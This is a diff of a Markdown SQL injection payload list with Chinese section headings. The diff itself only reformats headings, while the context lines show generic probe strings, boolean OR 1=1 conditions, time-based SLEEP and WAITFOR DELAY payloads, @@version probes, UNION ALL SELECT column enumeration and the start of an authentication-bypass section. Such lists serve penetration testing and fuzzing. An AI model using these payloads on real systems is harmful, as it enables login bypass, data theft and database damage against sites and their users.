@@ -1,14 +1,13 @@
-#Sql-injection-Payload-Find-the-sql
+# Sql-injection-Payload-Find-the-sql
 
-##Summary
-* [通用 SQL 注入负载](#通用 SQL 注入负载)
+## Summary
+* [通用SQL注入负载](#通用SQL注入负载)
 * [基于通用错误的有效负载](#基于通用错误的有效负载)
-* [基于时间的通用 SQL 注入负载](#基于时间的通用 SQL 注入负载)
+* [基于时间的通用SQL注入负载](#基于时间的通用SQL注入负载)
 * [通用联合查询有效负载](#通用联合查询有效负载)
-* [SQL 注入身份验证绕过有效负载](#SQL 注入身份验证绕过有效负载)
+* [SQL注入身份验证绕过有效负载](#SQL注入身份验证绕过有效负载)
 
-##通用 SQL 注入负载
-
+## 通用SQL注入负载
 '
 ''
 `
@@ -45,7 +44,7 @@
 @@variable  global variable
 
 
-# Numeric
+## Numeric
 AND 1
 AND 0
 AND true
@@ -90,7 +89,7 @@ Time-Based:
 %2c(select%20*%20from%20(select(sleep(10)))a)
 ';WAITFOR DELAY '0:0:30'--
 
-##基于通用错误的有效负载
+## 基于通用错误的有效负载
 
  OR 1=1
  OR 1=0
@@ -247,7 +246,7 @@ IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--
  and (select substring(@@version,3,1))='S'
  and (select substring(@@version,3,1))='X'
 
-##基于时间的通用 SQL 注入负载
+## 基于时间的通用SQL注入负载
 
 sleep(5)#
 1 or sleep(5)#
@@ -344,7 +343,7 @@ AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
 OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
 SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
 
-##通用联合查询有效负载
+## 通用联合查询有效负载
 
  ORDER BY SLEEP(5)
  ORDER BY 1,SLEEP(5)
@@ -766,7 +765,7 @@ SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#
 
-##SQL 注入身份验证绕过有效负载
+## SQL注入身份验证绕过有效负载
 
 '-'
 ' '
